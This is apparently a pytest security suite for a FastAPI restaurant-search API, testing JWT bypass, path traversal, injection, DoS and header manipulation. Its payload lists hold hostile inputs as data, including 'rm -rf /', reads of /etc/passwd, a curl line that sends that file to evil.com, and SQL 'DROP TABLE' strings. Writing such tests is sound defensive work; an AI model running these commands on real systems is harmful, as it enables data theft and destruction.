"""
Security tests for authentication bypass attempts.

Tests various security scenarios including authentication bypass attempts,
token manipulation, injection attacks, and unauthorized access patterns.
"""

import pytest
import jwt
import json
from datetime import datetime, timezone, timedelta
from unittest.mock import patch, Mock
from fastapi.testclient import TestClient

from main import app
from middleware.jwt_validator import JWTValidationError


class TestAuthenticationBypassAttempts:
    """Test cases for authentication bypass attempts."""
    
    @pytest.fixture
    def client(self):
        """Create test client without authentication mocking."""
        return TestClient(app)
    
    def test_missing_authorization_header_attack(self, client):
        """Test requests without authorization header to protected endpoints."""
        protected_endpoints = [
            "/api/v1/restaurants/search/district",
            "/api/v1/restaurants/search/meal-type",
            "/api/v1/restaurants/search/combined",
            "/api/v1/restaurants/recommend",
            "/api/v1/restaurants/analyze",
            "/api/v1/tools/metadata",
            "/metrics"
        ]
        
        for endpoint in protected_endpoints:
            if endpoint == "/metrics":
                response = client.get(endpoint)
            else:
                response = client.post(endpoint, json={})
            
            assert response.status_code == 401, f"Endpoint {endpoint} should require authentication"
            data = response.json()
            assert data["success"] is False
            assert "authorization" in data["error"]["message"].lower()
    
    def test_invalid_authorization_header_formats(self, client):
        """Test various invalid authorization header formats."""
        invalid_headers = [
            {"Authorization": ""},
            {"Authorization": "Bearer"},
            {"Authorization": "Bearer "},
            {"Authorization": "Basic dGVzdDp0ZXN0"},  # Basic auth instead of Bearer
            {"Authorization": "Token abc123"},  # Wrong scheme
            {"Authorization": "bearer token"},  # Wrong case
            {"Authorization": "Bearer\ttoken"},  # Tab character
            {"Authorization": "Bearer\ntoken"},  # Newline character
            {"Authorization": "Bearer token extra"},  # Extra content
        ]
        
        for headers in invalid_headers:
            response = client.post(
                "/api/v1/restaurants/search/district",
                json={"districts": ["Central district"]},
                headers=headers
            )
            
            assert response.status_code == 401
            data = response.json()
            assert data["success"] is False
            assert any(keyword in data["error"]["message"].lower() 
                      for keyword in ["authorization", "invalid", "format", "required"])
    
    def test_malformed_jwt_tokens(self, client):
        """Test various malformed JWT tokens."""
        malformed_tokens = [
            "invalid.token.format",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9",  # Missing parts
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.",  # Empty payload
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..",  # Empty payload and signature
            "not.a.jwt.token.at.all",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid_base64.signature",
            "header.payload",  # Only two parts
            "",  # Empty token
            "a" * 1000,  # Extremely long token
        ]
        
        for token in malformed_tokens:
            response = client.post(
                "/api/v1/restaurants/search/district",
                json={"districts": ["Central district"]},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            assert response.status_code == 401
            data = response.json()
            assert data["success"] is False
            assert "invalid" in data["error"]["message"].lower()
    
    def test_expired_jwt_token_attack(self, client):
        """Test using expired JWT tokens."""
        # Create an expired token
        expired_payload = {
            "sub": "test-user",
            "username": "testuser",
            "token_use": "access",
            "aud": "test-client-id",
            "iss": "https://cognito-idp.us-east-1.amazonaws.com/us-east-1_TEST",
            "exp": int((datetime.now(timezone.utc) - timedelta(hours=1)).timestamp()),
            "iat": int((datetime.now(timezone.utc) - timedelta(hours=2)).timestamp())
        }
        expired_token = jwt.encode(expired_payload, "secret", algorithm="HS256")
        
        response = client.post(
            "/api/v1/restaurants/search/district",
            json={"districts": ["Central district"]},
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        
        assert response.status_code == 401
        data = response.json()
        assert data["success"] is False
        assert any(keyword in data["error"]["message"].lower() 
                  for keyword in ["expired", "invalid", "token"])
    
    def test_token_with_invalid_signature(self, client):
        """Test JWT tokens with invalid signatures."""
        # Create a token with valid structure but invalid signature
        valid_payload = {
            "sub": "test-user",
            "username": "testuser",
            "token_use": "access",
            "aud": "test-client-id",
            "iss": "https://cognito-idp.us-east-1.amazonaws.com/us-east-1_TEST",
            "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp()),
            "iat": int(datetime.now(timezone.utc).timestamp())
        }
        
        # Sign with wrong secret
        invalid_token = jwt.encode(valid_payload, "wrong-secret", algorithm="HS256")
        
        response = client.post(
            "/api/v1/restaurants/search/district",
            json={"districts": ["Central district"]},
            headers={"Authorization": f"Bearer {invalid_token}"}
        )
        
        assert response.status_code == 401
        data = response.json()
        assert data["success"] is False
        assert "invalid" in data["error"]["message"].lower()
    
    def test_token_with_missing_required_claims(self, client):
        """Test JWT tokens missing required claims."""
        incomplete_tokens = [
            # Missing 'sub' claim
            {
                "username": "testuser",
                "token_use": "access",
                "aud": "test-client-id",
                "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
            },
            # Missing 'token_use' claim
            {
                "sub": "test-user",
                "username": "testuser",
                "aud": "test-client-id",
                "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
            },
            # Wrong token_use value
            {
                "sub": "test-user",
                "username": "testuser",
                "token_use": "refresh",  # Should be 'access'
                "aud": "test-client-id",
                "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
            },
            # Empty payload
            {}
        ]
        
        for payload in incomplete_tokens:
            token = jwt.encode(payload, "secret", algorithm="HS256")
            
            response = client.post(
                "/api/v1/restaurants/search/district",
                json={"districts": ["Central district"]},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            assert response.status_code == 401
            data = response.json()
            assert data["success"] is False
    
    def test_bypass_path_enumeration_attack(self, client):
        """Test attempting to access protected endpoints through bypass path manipulation."""
        bypass_attempts = [
            "/health/../api/v1/restaurants/search/district",
            "/docs/../api/v1/restaurants/recommend",
            "/health/../../api/v1/tools/metadata",
            "/health%2F..%2Fapi%2Fv1%2Frestaurants%2Fsearch%2Fdistrict",  # URL encoded
            "/health/./api/v1/restaurants/analyze",
            "//health/../api/v1/restaurants/search/meal-type",
        ]
        
        for path in bypass_attempts:
            response = client.post(path, json={})
            # These should either be 404 (path not found) or 401 (unauthorized)
            # They should NOT return 200 or access protected resources
            assert response.status_code in [401, 404, 405]
    
    def test_case_sensitivity_bypass_attempts(self, client):
        """Test case sensitivity in bypass path checking."""
        case_variations = [
            "/HEALTH",
            "/Health",
            "/hEaLtH",
            "/DOCS",
            "/Docs",
            "/API/V1/RESTAURANTS/SEARCH/DISTRICT",
        ]
        
        for path in case_variations:
            if path.upper().startswith(("/HEALTH", "/DOCS")):
                # These might be valid bypass paths depending on configuration
                response = client.get(path)
                # Should either work (200) or not found (404), but not unauthorized (401)
                assert response.status_code in [200, 404]
            else:
                # Protected endpoints should require auth regardless of case
                response = client.post(path, json={})
                assert response.status_code in [401, 404, 405]


class TestInjectionAttacks:
    """Test cases for various injection attacks."""
    
    @pytest.fixture
    def client_with_auth(self, client_with_auth_bypass):
        """Use authenticated client for injection tests."""
        return client_with_auth_bypass
    
    @pytest.fixture
    def auth_headers(self):
        """Authentication headers for injection tests."""
        return {"Authorization": "Bearer test-jwt-token"}
    
    def test_sql_injection_in_parameters(self, client_with_auth, auth_headers):
        """Test SQL injection attempts in request parameters."""
        sql_injection_payloads = [
            "'; DROP TABLE restaurants; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "' UNION SELECT * FROM sensitive_data --",
            "admin'--",
            "' OR 1=1 --",
        ]
        
        with patch("api.restaurant_endpoints.get_mcp_client_manager") as mock_get_client:
            mock_client = Mock()
            mock_client.call_mcp_tool.return_value = {"success": True, "data": {"restaurants": []}}
            mock_get_client.return_value = mock_client
            
            for payload in sql_injection_payloads:
                response = client_with_auth.post(
                    "/api/v1/restaurants/search/district",
                    json={"districts": [payload]},
                    headers=auth_headers
                )
                
                # Should either validate and reject, or pass through safely to MCP
                assert response.status_code in [200, 400]
                if response.status_code == 200:
                    # If accepted, verify it was passed safely to MCP server
                    mock_client.call_mcp_tool.assert_called()
    
    def test_xss_injection_in_parameters(self, client_with_auth, auth_headers):
        """Test XSS injection attempts in request parameters."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "<svg onload=alert('xss')>",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
        ]
        
        with patch("api.restaurant_endpoints.get_mcp_client_manager") as mock_get_client:
            mock_client = Mock()
            mock_client.call_mcp_tool.return_value = {"success": True, "data": {"restaurants": []}}
            mock_get_client.return_value = mock_client
            
            for payload in xss_payloads:
                response = client_with_auth.post(
                    "/api/v1/restaurants/search/district",
                    json={"districts": [payload]},
                    headers=auth_headers
                )
                
                # Should handle XSS payloads safely
                assert response.status_code in [200, 400]
                
                if response.status_code == 200:
                    data = response.json()
                    # Verify response doesn't contain unescaped script content
                    response_text = json.dumps(data)
                    assert "<script>" not in response_text
                    assert "javascript:" not in response_text
    
    def test_command_injection_in_parameters(self, client_with_auth, auth_headers):
        """Test command injection attempts in request parameters."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/hosts)",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
        ]
        
        with patch("api.restaurant_endpoints.get_mcp_client_manager") as mock_get_client:
            mock_client = Mock()
            mock_client.call_mcp_tool.return_value = {"success": True, "data": {"restaurants": []}}
            mock_get_client.return_value = mock_client
            
            for payload in command_injection_payloads:
                response = client_with_auth.post(
                    "/api/v1/restaurants/search/district",
                    json={"districts": [payload]},
                    headers=auth_headers
                )
                
                # Should handle command injection safely
                assert response.status_code in [200, 400]
    
    def test_json_injection_attacks(self, client_with_auth, auth_headers):
        """Test JSON injection and malformed JSON attacks."""
        json_attacks = [
            '{"districts": ["test"], "extra": {"__proto__": {"admin": true}}}',  # Prototype pollution
            '{"districts": ["test"], "constructor": {"prototype": {"admin": true}}}',
            '{"districts": ["test"]} {"malicious": "payload"}',  # Multiple JSON objects
        ]
        
        for attack_json in json_attacks:
            try:
                # Try to send malformed JSON
                response = client_with_auth.post(
                    "/api/v1/restaurants/search/district",
                    data=attack_json,
                    headers={**auth_headers, "Content-Type": "application/json"}
                )
                
                # Should reject malformed JSON
                assert response.status_code in [400, 422]
            except Exception:
                # JSON parsing errors are acceptable
                pass


class TestRateLimitingAndDOS:
    """Test cases for rate limiting and denial of service protection."""
    
    @pytest.fixture
    def client_with_auth(self, client_with_auth_bypass):
        """Use authenticated client for rate limiting tests."""
        return client_with_auth_bypass
    
    @pytest.fixture
    def auth_headers(self):
        """Authentication headers for rate limiting tests."""
        return {"Authorization": "Bearer test-jwt-token"}
    
    def test_large_payload_attack(self, client_with_auth, auth_headers):
        """Test handling of extremely large payloads."""
        # Create a large payload
        large_districts = ["District_" + str(i) for i in range(10000)]
        
        with patch("api.restaurant_endpoints.get_mcp_client_manager") as mock_get_client:
            mock_client = Mock()
            mock_client.call_mcp_tool.return_value = {"success": True, "data": {"restaurants": []}}
            mock_get_client.return_value = mock_client
            
            response = client_with_auth.post(
                "/api/v1/restaurants/search/district",
                json={"districts": large_districts},
                headers=auth_headers
            )
            
            # Should either handle gracefully or reject with appropriate error
            assert response.status_code in [200, 400, 413, 422]
    
    def test_deeply_nested_json_attack(self, client_with_auth, auth_headers):
        """Test handling of deeply nested JSON structures."""
        # Create deeply nested JSON
        nested_data = {"districts": ["test"]}
        for i in range(100):
            nested_data = {"level_" + str(i): nested_data}
        
        response = client_with_auth.post(
            "/api/v1/restaurants/search/district",
            json=nested_data,
            headers=auth_headers
        )
        
        # Should reject deeply nested structures
        assert response.status_code in [400, 422]
    
    def test_concurrent_request_handling(self, client_with_auth, auth_headers):
        """Test handling of concurrent requests (basic DOS protection)."""
        import threading
        import time
        
        results = []
        
        def make_request():
            with patch("api.restaurant_endpoints.get_mcp_client_manager") as mock_get_client:
                mock_client = Mock()
                mock_client.call_mcp_tool.return_value = {"success": True, "data": {"restaurants": []}}
                mock_get_client.return_value = mock_client
                
                response = client_with_auth.post(
                    "/api/v1/restaurants/search/district",
                    json={"districts": ["Central district"]},
                    headers=auth_headers
                )
                results.append(response.status_code)
        
        # Create multiple concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # All requests should be handled (may be rate limited but not crash)
        assert len(results) == 10
        assert all(status in [200, 429, 503] for status in results)


class TestHeaderManipulationAttacks:
    """Test cases for HTTP header manipulation attacks."""
    
    @pytest.fixture
    def client(self):
        """Create test client for header manipulation tests."""
        return TestClient(app)
    
    def test_host_header_injection(self, client):
        """Test Host header injection attacks."""
        malicious_hosts = [
            "evil.com",
            "localhost:8080\r\nX-Injected: malicious",
            "example.com\nX-Forwarded-For: 127.0.0.1",
        ]
        
        for host in malicious_hosts:
            response = client.get(
                "/health",
                headers={"Host": host}
            )
            
            # Should handle malicious hosts safely
            assert response.status_code in [200, 400]
    
    def test_user_agent_manipulation(self, client_with_auth_bypass, auth_headers):
        """Test User-Agent header manipulation."""
        malicious_user_agents = [
            "<script>alert('xss')</script>",
            "Mozilla/5.0\r\nX-Injected: malicious",
            "A" * 10000,  # Extremely long user agent
            "",  # Empty user agent
        ]
        
        for user_agent in malicious_user_agents:
            response = client_with_auth_bypass.post(
                "/api/v1/restaurants/search/district",
                json={"districts": ["Central district"]},
                headers={**auth_headers, "User-Agent": user_agent}
            )
            
            # Should handle malicious user agents safely
            assert response.status_code in [200, 400]
    
    def test_content_type_manipulation(self, client_with_auth_bypass, auth_headers):
        """Test Content-Type header manipulation."""
        malicious_content_types = [
            "application/json; charset=utf-8\r\nX-Injected: malicious",
            "text/html",  # Wrong content type
            "application/xml",  # Wrong content type
            "",  # Empty content type
        ]
        
        for content_type in malicious_content_types:
            response = client_with_auth_bypass.post(
                "/api/v1/restaurants/search/district",
                json={"districts": ["Central district"]},
                headers={**auth_headers, "Content-Type": content_type}
            )
            
            # Should handle content type manipulation appropriately
            assert response.status_code in [200, 400, 415, 422]


class TestAuthorizationEscalation:
    """Test cases for authorization escalation attempts."""
    
    def test_token_reuse_across_users(self, client):
        """Test that tokens cannot be reused across different user contexts."""
        # This would require more complex setup with real token validation
        # For now, we test that the system properly validates token claims
        
        user1_token = jwt.encode({
            "sub": "user1",
            "username": "user1",
            "token_use": "access",
            "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
        }, "secret", algorithm="HS256")
        
        user2_token = jwt.encode({
            "sub": "user2", 
            "username": "user2",
            "token_use": "access",
            "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
        }, "secret", algorithm="HS256")
        
        # Both tokens should be handled independently
        for token in [user1_token, user2_token]:
            response = client.post(
                "/api/v1/restaurants/search/district",
                json={"districts": ["Central district"]},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            # Should validate each token independently
            assert response.status_code in [200, 401]
    
    def test_privilege_escalation_through_claims(self, client):
        """Test privilege escalation through JWT claims manipulation."""
        escalation_tokens = [
            # Admin claim injection
            {
                "sub": "user1",
                "username": "user1", 
                "admin": True,
                "token_use": "access",
                "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
            },
            # Role claim injection
            {
                "sub": "user1",
                "username": "user1",
                "role": "admin",
                "token_use": "access", 
                "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
            },
            # Scope escalation
            {
                "sub": "user1",
                "username": "user1",
                "scope": "admin:read admin:write",
                "token_use": "access",
                "exp": int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
            }
        ]
        
        for claims in escalation_tokens:
            token = jwt.encode(claims, "secret", algorithm="HS256")
            
            response = client.post(
                "/api/v1/restaurants/search/district",
                json={"districts": ["Central district"]},
                headers={"Authorization": f"Bearer {token}"}
            )
            
            # Should not grant elevated privileges based on injected claims
            assert response.status_code in [200, 401]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])